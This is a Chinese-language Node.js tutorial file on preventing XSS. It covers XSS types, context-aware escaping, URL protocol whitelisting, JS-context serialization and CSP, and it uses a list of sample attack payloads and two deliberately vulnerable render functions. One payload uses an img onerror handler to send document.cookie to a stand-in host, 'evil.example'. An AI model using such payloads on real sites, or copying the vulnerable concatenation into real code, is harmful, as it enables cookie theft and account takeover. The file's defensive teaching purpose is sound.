/**
 * ============================================================================
 * 知识点：XSS 跨站脚本攻击的原理与防御 —— HTML 转义、上下文区分、CSP
 * ============================================================================
 *
 * 【所属分类】32_security_and_best_practices —— 安全与最佳实践
 * 【难度等级】进阶
 * 【前置知识】32_security_and_best_practices/01_input_validation.js
 *
 * 【知识点说明】
 *
 * 1. 是什么
 *    XSS（Cross-Site Scripting，跨站脚本）指的是：攻击者把一段 JavaScript 代码
 *    "塞进"了你的页面，使得这段代码在其他用户的浏览器里、以你的网站的身份执行。
 *    它要成立必须同时满足两个条件：
 *      (1) 数据（攻击者的输入）流到了页面输出里（"注入点"）；
 *      (2) 这个注入点处于"会被浏览器当成代码/标签解析"的位置（"执行上下文"）。
 *    经典分类（按恶意脚本"存哪儿"划分）：
 *      - 存储型（Stored）：恶意内容被存进数据库，每个访问该页面的用户都会中招。
 *        危害最大，常见于评论、昵称、留言板、个人签名。
 *      - 反射型（Reflected）：恶意内容在 URL 参数里，服务端原样"反射"回 HTML。
 *        需要诱导受害者点击特制链接（钓鱼），一次性。
 *      - DOM 型（DOM-based）：服务端完全没参与，纯前端 JS 把 location.hash / 输入框内容
 *        写进 innerHTML。也是最容易被前端同学忽略的一类。
 *
 * 2. 为什么需要（真实项目场景）
 *    (a) XSS 的后果不是"弹个 alert"这么可爱：脚本可以读 document.cookie（未设 HttpOnly 时）、
 *        偷 localStorage 里的 token、伪造请求（CSRF 的跳板）、篡改页面骗用户输入密码、
 *        甚至用受害者的浏览器当跳板扫描内网。
 *    (b) 只要页面里有"用户内容"就有风险：商品评论、聊天消息、用户昵称、搜索结果回显、
 *        富文本编辑器、报表导出、邮件模板……几乎每个业务系统都逃不掉。
 *    (c) 防御是分层的（纵深防御）：输入校验 + 输出转义 + CSP + Cookie 安全属性，
 *        任何一层单独都不够。本文件聚焦最核心的一层：**输出转义/编码**。
 *
 * 3. 核心语法要点
 *    - 最核心的一条规则：**在把数据放进 HTML 的那一刻，按它所在的"上下文"做转义**。
 *      不是"输入时转义一次就完事"，而是"每个输出点各自转义"。
 *    - HTML 文本上下文：转义 & < > " ' /（本文件给出对照表）。
 *    - HTML 属性上下文：属性值**必须加引号**，然后转义引号与 &（不加引号的属性极其危险）。
 *    - URL 上下文：用 encodeURIComponent，并且对协议做白名单（只允许 http/https/mailto），
 *      否则 javascript: / data: 协议可以执行脚本。
 *    - JavaScript 上下文：用 JSON.stringify 输出，并额外转义 < > & 与 U+2028/U+2029。
 *    - 现代前端框架（React/Vue）默认对"插值"做转义，但一旦使用
 *      dangerouslySetInnerHTML / v-html，框架的保护就完全失效了。
 *    - CSP（Content-Security-Policy）是最后一道网：即使脚本被注入，也让浏览器拒绝执行。
 *
 * 4. 常见陷阱
 *    - "输入时转义一次，输出到处直接用"：同一份数据在 HTML 属性里和 JS 里需要不同编码，
 *      转义必须发生在输出点。这也是"存储型 XSS 明明存的是转义后的文本，还是被打穿"的原因。
 *    - 转义顺序错误：必须先替换 &，否则 &lt; 会被二次转义成 &amp;lt;（显示成 &lt;）。
 *    - 只转义 < > 而不转义引号：属性里用单引号包裹时，' 就能逃逸出来加事件属性。
 *    - 黑名单过滤（如"删掉 <script>"）会被大小写、嵌套标签、其他标签的事件属性绕过。
 *    - 富文本场景"允许一部分 HTML"：必须用 DOMPurify 这类成熟库做白名单清洗，别自己写。
 *    - 认为"前端框架自动转义所以不用管"：dangerouslySetInnerHTML / v-html / innerHTML 处全裸。
 *    - 忘了 URL 的协议校验：`<a href="javascript:...">` 也是 XSS。
 *
 * 【运行方法】
 *   在仓库根目录执行：node 32_security_and_best_practices/02_xss_prevention.js
 *
 * 【预期输出】
 *   打印"拼接用户输入得到的恶意 HTML 字符串"（只打印文本，绝不渲染、绝不执行），
 *   再用转义函数、属性引号策略、URL 协议白名单、JS 上下文序列化逐一对同一批
 *   攻击载荷做对比，输出转义前后的字符串与逐字符对照表，全程退出码 0。
 * ============================================================================
 */

// ============================================================================
// 小节 1：XSS 三种类型（存储型 / 反射型 / DOM 型）
// ============================================================================
console.log('--- 1. XSS 的三种类型 ---');

const xssTypes = [
  [
    '存储型 Stored',
    '恶意内容被服务端保存（评论、昵称、签名），任何访问该页面的用户都会执行。',
    '危害最大、影响面最广，因为不需要诱导点击。',
  ],
  [
    '反射型 Reflected',
    '恶意内容写在 URL 参数里，服务端把它原样拼进返回的 HTML（如"搜索关键词：xxx"）。',
    '需要诱导受害者点击特制链接，一次性，常配合钓鱼邮件。',
  ],
  [
    'DOM 型 DOM-based',
    '服务端返回的 HTML 完全正常，是前端 JS 自己把 location.hash / 输入框内容写进 innerHTML。',
    '最容易被前端忽略，因为服务端日志里看不出任何异常。',
  ],
];
for (const [name, how, risk] of xssTypes) {
  console.log(`  ${name}`);
  console.log(`    形成方式：${how}`);
  console.log(`    特点　　：${risk}`);
}

// ============================================================================
// 小节 2：攻击原理 —— 一切从"字符串拼接"开始
// ============================================================================
console.log('\n--- 2. 攻击原理：拼接用户输入到 HTML 字符串 ---');

// 攻击载荷全部只是普通字符串。本文件只对它们做"转义"，绝不把结果交给
// 任何能解析 HTML/执行脚本的东西（没有 document、没有 innerHTML、没有 eval）。
const payloads = {
  basic: '<script>alert(document.cookie)</script>',
  imgOnerror: '<img src=x onerror="fetch(\'//evil.example/steal?c=\'+document.cookie)">',
  attrBreak: '" onmouseover="alert(1)',
  attrBreakSingle: "' onfocus='alert(1)",
  svgOnload: '<svg onload=alert(1)>',
  jsUrl: 'javascript:alert(document.domain)',
  dataUrl: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  domSource: '<iframe srcdoc="<script>parent.postMessage(1)</script>"></iframe>',
};

/**
 * 漏洞示范：把用户输入直接拼进 HTML 模板字符串。
 * 这个函数只**返回字符串**，不渲染、不插入页面 —— 这里演示的是"拼出来的东西长什么样"。
 * 在真实项目里，这个返回值一旦被塞进 element.innerHTML，攻击就完成了。
 * @param {string} userInput 完全不可信的用户输入
 * @returns {string} 拼好的 HTML 字符串（危险品，仅供观察）
 */
function vulnerableRenderProfile(userInput) {
  // 反面教材：没有任何转义，用户输入就是 HTML 语法本身
  return `<div class="profile"><span class="name">${userInput}</span></div>`;
}

/**
 * 另一个反面教材：属性值不加引号 —— 这是最容易被忽视的 XSS 形态。
 * @param {string} userInput
 * @returns {string}
 */
function vulnerableRenderAvatar(userInput) {
  // 反面教材：src 的值没有引号包裹，空格就能"跳出"属性，写入新的属性
  return `<img class="avatar" src=${userInput}>`;
}

console.log('  [漏洞代码] <span class="name">${userInput}</span>');
console.log(`  攻击载荷: ${payloads.basic}`);
console.log(`  拼接结果: ${vulnerableRenderProfile(payloads.basic)}`);
console.log('  -> 浏览器解析这段 HTML 时，会老老实实创建一个 <script> 元素并执行它。');
console.log('  -> 本文件只打印这个字符串，不交给任何解析器，所以进程是安全的。\n');

console.log('  [漏洞代码] <img src=${userInput}>  （属性值没有引号）');
console.log(`  攻击载荷: ${payloads.attrBreak}`);
console.log(`  拼接结果: ${vulnerableRenderAvatar(payloads.attrBreak)}`);
console.log('  -> 空格让 src 属性在此结束，"onmouseover=..." 变成了一个新的属性。');
console.log('  -> 结论：属性值必须用引号包起来，这是最低成本的一道防线。');

// ============================================================================
// 小节 3：HTML 转义函数 —— 对照表与实现
// ============================================================================
console.log('\n--- 3. HTML 转义：对照表与实现 ---');

// HTML 文本/属性上下文中需要转义的 6 个字符（& 必须最先处理！）
const ESCAPE_TABLE = [
  ['&', '&amp;', 'HTML 实体的起始符，不转义会让后面的实体被折叠/二次解析'],
  ['<', '&lt;', '标签开始，不转义可以直接创建新元素（最致命的那个）'],
  ['>', '&gt;', '标签结束，配合 < 使用；单独出现也可用于破坏注释等结构'],
  ['"', '&quot;', '双引号属性值的边界，不转义可逃逸出属性'],
  ["'", '&#39;', '单引号属性值的边界；HTML 里用 &#39; 比 &apos; 兼容性更好'],
  ['/', '&#x2F;', '结束标签与自闭合语法的一部分，顺带转义可降低 "/>" 类绕过的风险'],
];

console.log('  字符 | 实体     | 为什么要转义');
console.log('  -----|----------|-----------------------------------------------');
for (const [ch, entity, why] of ESCAPE_TABLE) {
  console.log(`   ${ch}   | ${entity.padEnd(8)} | ${why}`);
}

// 预编译的正则 + map，比连续 6 次 replace 更快（只扫一遍字符串）
const HTML_ESCAPE_RE = /[&<>"'/]/g;
const HTML_ESCAPE_MAP = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#39;',
  '/': '&#x2F;',
};

/**
 * HTML 转义：把"字符串"降级为"纯文本"，让浏览器永远把它当文字而不是标签。
 * 注意：这个实现用于**教学对照**。真实项目请直接使用 escape-html / he 等成熟库
 *       （见小节 6 的说明），因为手写转义器很容易在边界情况上出问题。
 * @param {unknown} value 任意值（内部会先转成字符串）
 * @returns {string} 转义后的安全字符串
 */
function escapeHtml(value) {
  // String(value) 而不是 value.replace：入参可能是数字/null，直接调用 .replace 会抛错
  return String(value).replace(HTML_ESCAPE_RE, (ch) => HTML_ESCAPE_MAP[ch]);
}

/**
 * 错误示范：先转义 <，再转义 & —— 顺序反了。
 * 结果是原本干净的 "&lt;" 被二次转义成 "&amp;lt;"，用户看到字面的 &lt; 而不是 <。
 * @param {string} value
 * @returns {string}
 */
function escapeHtmlWrongOrder(value) {
  return String(value)
    .replace(/</g, '&lt;') // 先处理 <
    .replace(/&/g, '&amp;'); // 再处理 & —— 把上一步产出的 & 也一起转义了！
}

console.log('\n  [顺序陷阱演示]');
const orderSample = 'a & b < c';
console.log(`    原始输入            : ${orderSample}`);
console.log(`    正确顺序（& 优先）  : ${escapeHtml(orderSample)}`);
console.log(`    错误顺序（< 优先）  : ${escapeHtmlWrongOrder(orderSample)}`);
console.log(`    -> 错误顺序下 "&" 变成了 "&amp;"，页面上会显示出多余字符。`);

console.log('\n  [逐载荷转义对比] 左=原始（危险）右=转义后（安全）');
for (const [name, p] of Object.entries(payloads)) {
  console.log(`    ${name}`);
  console.log(`      原始: ${p}`);
  console.log(`      转义: ${escapeHtml(p)}`);
}

// ============================================================================
// 小节 4：上下文决定转义策略 —— 同一份数据，四种位置，四种编码
// ============================================================================
console.log('\n--- 4. 上下文决定转义策略（不能"一次转义到处用"） ---');

/**
 * 属性上下文：属性值必须加引号 + 转义。
 * @param {string} value
 * @returns {string} 一个安全的属性片段
 */
function attrValue(value) {
  // 1) 强制加双引号（不加引号 = 空格即可逃逸）
  // 2) 用同一张转义表处理引号与 & < >
  return `"${escapeHtml(value)}"`;
}

/**
 * URL 上下文：协议白名单 + 危险字符编码。
 * 关键点：单靠 encodeURIComponent 并不能阻止 "javascript:" 这种协议 ——
 * 它会把 "javascript:alert(1)" 编码成 "javascript%3Aalert(1)"，
 * 虽然在这个例子里侥幸失效了，但它同时也会把合法的 https:// 链接编码坏。
 * 所以正确顺序是：先做协议白名单，再对少量危险字符做编码。
 * @param {string} url
 * @returns {string} 安全的 URL 或 "#"
 */
function safeUrl(url) {
  const raw = String(url).trim();
  // 第 1 步：协议白名单。只允许 http/https/mailto，以及 ./ ../ # 开头的相对路径。
  const allowed = /^(https?:|mailto:)/i;
  const isRelative = raw === '' || /^[./#]/.test(raw);
  if (!allowed.test(raw) && !isRelative) {
    // 默认拒绝：javascript: / data: / vbscript: 等一律降级成无害的 "#"
    return '#';
  }
  // 第 2 步：只编码那些能"逃出属性"或"改变解析"的字符，保留 URL 的可读结构。
  // 真实项目建议直接用 WHATWG 的 URL 类（new URL(input, base)）来解析与重组。
  return raw.replace(/[<>"'`\s\\]/g, (ch) => encodeURIComponent(ch));
}

/**
 * JavaScript 上下文：把数据安全地嵌进 <script> 里。
 * 做法：JSON.stringify + 额外转义 < > & 和 U+2028/U+2029。
 * @param {unknown} data
 * @returns {string}
 */
function jsSafe(data) {
  return JSON.stringify(data)
    .replace(/</g, '\\u003C') // 防止出现 </script> 提前关闭脚本块
    .replace(/>/g, '\\u003E')
    .replace(/&/g, '\\u0026') // 兼容 XHTML 与部分旧解析器
    .replace(/\u2028/g, '\\u2028') // 行分隔符：在 JS 里是换行，会破坏字符串字面量
    .replace(/\u2029/g, '\\u2029'); // 段分隔符：同上
}

console.log('  场景① HTML 文本：`<p>${escapeHtml(name)}</p>`');
console.log(`    载荷 basic    -> ${escapeHtml(payloads.basic)}`);
console.log(`    载荷 imgOnerror -> ${escapeHtml(payloads.imgOnerror)}`);

console.log('  场景② HTML 属性：`<a title=${attrValue(name)}>x</a>`');
console.log(`    载荷 attrBreak      -> ${attrValue(payloads.attrBreak)}`);
console.log(`    载荷 attrBreakSingle -> ${attrValue(payloads.attrBreakSingle)}`);
console.log('    -> 引号被转义成 &quot;，属性无法被"提前关闭"，事件属性注入失败。');

console.log('  场景③ URL：`<a href="${safeUrl(userUrl)}">x</a>`');
const urlCases = [
  payloads.jsUrl,
  payloads.dataUrl,
  'https://example.com/a?x=1&y=2',
  '  javascript:alert(1)',
  'javascript:alert(1)',
];
for (const u of urlCases) {
  console.log(`    ${u.padEnd(46)} -> ${safeUrl(u)}`);
}
console.log('    -> javascript:/data: 被协议白名单拦下，降级为 "#"；');
console.log('       正常 https 链接结构完整保留，仍可正常点击。');

console.log('  场景④ JS 上下文：`<script>var d = ${jsSafe(obj)};</script>`');
const jsPayload = { name: '</script><script>alert(1)</script>', note: 'line\u2028break' };
console.log(`    原始对象: ${JSON.stringify(jsPayload)}`);
console.log(`    序列化后: ${jsSafe(jsPayload)}`);
console.log('    -> </script> 被写成 \\u003C/script\\u003E，无法提前关闭脚本块。');

console.log('\n  [反例] 同一份 HTML 转义结果用在四个上下文里会怎样：');
const escaped = escapeHtml('<b>hi</b>');
console.log(`    escapeHtml('<b>hi</b>') = ${escaped}`);
console.log(`    放进 HTML 文本 : 安全，显示粗体标签的字面文本`);
console.log(`    放进 URL       : 语义错误（&amp; 不是 URL 编码），链接会坏`);
console.log(`    放进 JS 字符串 : 字符串里出现 &lt; 这类实体，数据被污染`);
console.log('    -> 结论：转义发生在"输出点"，每个上下文用各自的方法，不能复用同一份结果。');

// ============================================================================
// 小节 5：dangerouslySetInnerHTML / v-html / innerHTML 的风险
// ============================================================================
console.log('\n--- 5. 为什么 dangerouslySetInnerHTML 这么"危险" ---');

console.log('  React 的插值 {text} 默认会做转义：');
console.log('    <div>{userInput}</div>            // 安全，等价于 textContent');
console.log('    <div dangerouslySetInnerHTML={{__html: userInput}} />  // 不转义！等于 innerHTML');
console.log('  Vue 同理：{{ text }} 安全，v-html 危险。原生 DOM：textContent 安全，innerHTML 危险。');
console.log(`  用本例载荷试一下：把 ${payloads.imgOnerror.slice(0, 30)}... 交给 innerHTML，`);
console.log('  浏览器会真的创建 <img> 元素并因加载失败触发 onerror —— 脚本就执行了。');
console.log('  -> 使用前必须做两件事：(1) 用 DOMPurify 这类库做白名单净化；(2) 尽量改用 textContent。');

/**
 * 一个"极简净化器"，仅用于说明"白名单净化"的思路。
 * 真实项目请勿使用 —— 现实中的 HTML 解析极其复杂，必须用 DOMPurify。
 * @param {string} html
 * @returns {string}
 */
function naiveSanitize(html) {
  // 只保留白名单标签，其余全部转义为文本
  const ALLOWED_TAGS = new Set(['b', 'i', 'u', 'em', 'strong', 'p', 'br']);
  let out = String(html);
  out = out.replace(/<\/?([a-zA-Z][a-zA-Z0-9]*)\b[^>]*>/g, (match, tag) => {
    return ALLOWED_TAGS.has(tag.toLowerCase()) ? match : escapeHtml(match);
  });
  return out;
}
console.log('\n  [极简净化器演示 — 仅用于理解思路，生产请用 DOMPurify]');
for (const p of [payloads.basic, payloads.imgOnerror, '<b>加粗</b>是允许的']) {
  console.log(`    输入: ${p}`);
  console.log(`    输出: ${naiveSanitize(p)}`);
}
console.log('    -> 注意它无法处理畸形标签、属性注入、SVG/MathML 命名空间等真实绕过手法，');
console.log('       这正是"不要自己写净化器"的原因。');

// ============================================================================
// 小节 6：CSP —— 即使被注入，也让浏览器拒绝执行
// ============================================================================
console.log('\n--- 6. CSP（内容安全策略）：最后一道网 ---');

const cspDirectives = [
  ["default-src 'self'", '默认只允许加载本站资源，其他一律拒绝'],
  ["script-src 'self' 'nonce-<每次请求随机>'", '脚本只允许本站 + 带正确 nonce 的内联脚本；攻击者注入的 <script> 没有 nonce，被拒绝'],
  ["object-src 'none'", '禁掉 Flash/插件类对象，缩小面'],
  ["base-uri 'none'", '防止攻击者用 <base> 改写所有相对链接的指向'],
  ["frame-ancestors 'none'", '禁止被其他站点用 iframe 嵌套（防点击劫持）'],
  ["form-action 'self'", '表单只能提交到本站，防"钓鱼表单劫持"'],
];
console.log('  常见指令：');
for (const [d, why] of cspDirectives) console.log(`    ${d.padEnd(42)} // ${why}`);
console.log('  设置方式：HTTP 响应头 Content-Security-Policy: ...');
console.log('  要点：');
console.log('    - 避免使用 \'unsafe-inline\'（等于没开 CSP）与 \'unsafe-eval\'；');
console.log("    - 用 nonce 或 hash 精确放行必需的内联脚本；");
console.log('    - CSP 是"减轻危害"的兜底，不能替代输出转义；');
console.log("    - 配套设置 Cookie 的 HttpOnly/Secure/SameSite，让被注入的脚本偷不到会话。");

// ============================================================================
// 小节 7：不要自己写 HTML 转义器 / 净化器
// ============================================================================
console.log('\n--- 7. 不要自己写转义器，用成熟库 ---');

const libraryAdvice = [
  ['escape-html', '极小的 HTML 转义库（Express 内部就用它），只做文本/属性转义这一件事'],
  ['he / entities', '完整的 HTML 实体编解码库，处理命名实体与数字实体'],
  ['DOMPurify', 'HTML 净化领域的业界标准，白名单清洗、持续跟进浏览器解析怪癖'],
  ['sanitize-html', '服务端（Node）侧的 HTML 白名单清洗，适合处理富文本'],
  ['validator.js', '校验与规范化（isURL / normalizeEmail / escape 等）'],
];
for (const [lib, desc] of libraryAdvice) {
  console.log(`    ${lib.padEnd(16)} ${desc}`);
}
console.log('  为什么不要手写：转义的坑在"边界情况"，而不是主干逻辑 ——');
console.log('    HTML 允许属性不加引号、允许实体没有分号、SVG/MathML 有自己的命名空间、');
console.log('    注释、CDATA、mXSS（浏览器重解析后再变异出可执行内容）……');
console.log('    这些细节只有长期维护的库才跟得上。');

// ============================================================================
// 小节 8：小结
// ============================================================================
console.log('\n--- 8. 小结 ---');
console.log('  1) XSS = 攻击者的数据流到了"会被解析成代码"的输出位置。');
console.log('  2) 核心防御：在输出点按上下文转义（HTML 文本 / 属性 / URL / JS 各有一套）。');
console.log('  3) 属性值必须加引号；URL 必须做协议白名单；JS 上下文用 JSON.stringify + 转义。');
console.log('  4) 转义顺序：& 必须最先处理，否则会二次转义。');
console.log('  5) dangerouslySetInnerHTML / v-html / innerHTML 是"关闭框架保护"的开关，');
console.log('     必须配合 DOMPurify 这类白名单净化器使用。');
console.log('  6) 纵深防御：输入校验（01 篇）+ 输出转义 + CSP + Cookie 安全属性，缺一不可。');
console.log('  7) 别自己写转义器/净化器，用成熟库 —— 转义的难点全在边界情况。');
